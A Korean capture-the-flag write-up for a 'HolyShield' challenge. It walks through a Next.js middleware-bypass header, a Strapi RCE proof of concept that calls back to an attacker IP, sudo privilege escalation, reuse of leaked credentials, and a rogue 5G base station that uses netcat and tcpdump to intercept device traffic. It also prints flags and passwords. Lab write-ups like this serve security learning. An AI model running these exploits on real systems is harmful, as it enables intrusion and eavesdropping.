# 0x1. 초기 침투

## 1. 관리자 패널에서 admin 크레덴셜 확보
```
CVE-2025-29927 (Middleware Bypass)

1. /robots.txt 에서 /admin 경로 확인

2. x-middleware-subrequest 헤더를 포함하여 /admin 경로에서 크레덴셜 확인
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware


title: Veritas Mobile
Full Name: Administrator
Email: veritasmobile@veritas.com
password: P@ssw0rd13579c4ts3cur1ty!
```

## 2. CVE-2023-22621 를 통한 RCE
```
CVE-2023-22621를 사용한 내부 침투. orpheus 유저 권한 획득

https://github.com/sofianeelhor/CVE-2023-22621-POC


python3 poc.py -url http://localhost:1337/ \
  -u "veritasmobile@veritas.com" \
  -p 'P@ssw0rd13579c4ts3cur1ty!' \
  -ip 132.145.90.226 \
  -port 8888

/home/orpheus/flag1.txt
HolyShield{C0ngr4ts_0n_entry!_Th3_R34l_Ch4ll3nge_Beg1ns_fr0m_n0w}
```

# 0x2. 권한 상승

## 3. CVE-2025-32463 를 사용한 권한상승
```
sudo 에서 발생한 권한상승 취약점(CVE-2025-32463)

https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/tree/main

/root/flag2.txt
HolyShield{Pr1v1l3ge_3scalation_Success_0nly_0n3_St3p_L3ft}
```

# 0x3. 후속 공격

## 4. Lateral Movement
```
id: Albert
pw: 1q2w3e4r!
port: 2222
```

## 5. UE 통신 탈취
```
환경 설명
UERANSIM과 Open5GS를 통해 구축한 환경에서 UE -> gNB -> Core로 기밀 메시지 전송 중

UE는 가장 가까운 gNB에 연결 됨

목표
가짜 gNB를 구축해 UE의 메시지를 탈취

과정
https://github.com/aligungr/UERANSIM

1. 위 UERANSIM github에서 gNB 부분 따로 분리
2. open5gs-gnb.yaml 파일에서 gtpIp를 가짜 gNB 내부 IP로 변경, amfConfigs를 제공 받은 공격 대상 Core의 외부 IP로 변경
3. 가짜 gNB를 도커를 통해 구축을 한 경우 가짜 gNB 컨테이너 쉘에 접속 후 아래 명령 입력 
```

```bash
apt update 
apt install netcat-openbsd
apt install tcpdump

printf '{"lat":37.5666,"lon":126.9781}\n' | nc-u-w1 34.64.74.66 4999
# gNB의 좌표를 UE와 가까운 곳으로 전송

tcpdump -i any -n-vv-X udp port 2152
# tcpdump를 통해 전송되는 플래그 획득
```